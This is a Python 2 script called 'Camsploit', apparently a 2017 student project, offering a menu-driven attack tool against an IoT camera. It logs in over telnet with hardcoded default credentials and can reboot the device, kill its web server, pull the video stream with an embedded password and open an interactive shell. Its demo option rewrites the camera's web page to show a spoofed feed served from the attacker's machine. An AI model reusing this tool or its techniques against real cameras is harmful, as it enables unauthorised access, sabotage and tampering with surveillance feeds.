import os,sys,time,socket,subprocess,telnetlib
LISTEN_PORT = 5000
HOST = "10.100.100.13"  #Victim IOT Camera
user = "admin"
password = "ipcam_rt"
banner = """
  
   ____                ____        _       _ _   
  / ___|__ _ _ __ ___ / ___| _ __ | | ___ (_) |_ 
 | |   / _` | '_ ` _ \\\___ \| '_ \| |/ _ \| | __|
 | |__| (_| | | | | | |___) | |_) | | (_) | | |_ 
  \____\__,_|_| |_| |_|____/| .__/|_|\___/|_|\__|
                            |_|                  

By: The HackED IOT Guys
Spring Cohort
Copyright 2017
=================================================
Welcome!!!
================================================="""

main = """Please Select an option:
[1] Reboot Camera
[2] Kill Feed
[3] Grab Stream
[4] Shell Session
[5] Perform Reconnaisance
[6]
[7]
[8]
[9] Play Spy Music

[d] Debug
[x] Demo
[0,q] Exit
"""

def loading(text):
    for i in range(10):
        sys.stdout.write("\r" + "[+] " + text + "." * i)
        time.sleep(0.1)
        sys.stdout.flush()
    print "\033[92m" + "\r" + "[+] " + text + "....................OK!\033[0m"

def prompt():
    raw_input("Press ENTER to continue. ")

def start_exploit():
    loading("Accessing Backdoor")
    loading("Crafting Exploit..")
    loading("Sending Exploit...")



def main_menu():
    os.system("clear")
    print banner
    print main
    choice = raw_input("Please select an option: ")
    exec_menu(choice)

def exec_menu(choice):
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print "Invalid selection, Please try again."
            time.sleep(0.5)
            menu_actions['main_menu']()
    return

#====================================================================
#                           Functions                               #
#===================================================================#
def reboot():
    command = "/bin/reboot\n"
    start_exploit()
    connect()
    tn.write(command + "\n")
    tn.write("exit" + "\n")
    tn.close()


    print "Send reboot command"
    prompt()
        
def kill():
    command = "/usr/bin/killall webs"
    start_exploit()
    connect()
    tn.write(command + "\n")
    tn.write("exit" + "\n")
    tn.close()

def view():
    os.system("wget 'http://" + HOST + "/vjpeg.v?user=admin&pwd=Admin1234!' -O stream")

def shell():
    start_exploit()
    connect()
    tn.interact()

def demo():
    self_ip = get_ip()
    FNULL = open(os.devnull, 'w')
    command1 = "cp /www/monitor4.asp /www/monitor.asp.bak1" #Creates backup
    command2 = "sed -i 's#/vjpeg.v#http://" + self_ip + ":4000#' /www/monitor4.asp && sed -i 's/pragma/refresh/' /www/monitor4.asp && sed -i 's/no-cache/7/' /www/monitor4.asp" #spoof stream
    command3 = "/root/start_web.sh" #restart webserver
    command4 = "cp /www/monitor.asp.bak1 /www/monitor4.asp"
    loading("Creating Fake Stream Server")
    os.system('socat TCP-LISTEN:4000,reuseaddr,fork EXEC:"pv -L 300k fakeheaders stream" &')
    start_exploit()
    connect()
    tn.write(command1 + "\n")
    tn.write(command2 + "\n")
    loading("Restarting Web Server......")
    tn.write(command3 + "\n")

    print "Stream is now spoofed!"
    raw_input("Press any key to revert back to normal:")
    tn.write(command4 + "\n")
    loading("Reverting Camera Feed......")
    print "Feed Restored!"
    prompt()
    os.system("killall socat")

def recon():
    print "Do some recon stuff"

def exit():
    print "Thank you for using Camsploit!"
    print "Happy hacking!!!!!"
    sys.exit()


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('www.google.com', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP
    
def debug():
    print "Printing Debug Information:" 
    print "Local IP Address: " + get_ip()
    print "Value of HOST: " + HOST
    print "Value of user: " + user
    print "Value of password " + password
    print "THIS IS A TEST " + get_ip() 

    prompt()

def connect():
    global tn 
    tn = telnetlib.Telnet(HOST)
    tn.read_until("login: ")
    tn.write(user + "\n")
    tn.read_until("Password: ")
    tn.write(password + "\n")

def exploit():
    tn.write(command + "\n")
    tn.write("exit" + "\n")



    


menu_actions = {
    'main_menu': main_menu,
    '1': reboot,
    '2': kill,
    '3': view,
    '4': shell,
    '5': recon,
    'x': demo,
    'd': debug,
    '0': exit,
    'q': exit,
}


while True:
    try:
        main_menu()
    except KeyboardInterrupt:
        print"\n"
        exit()

	
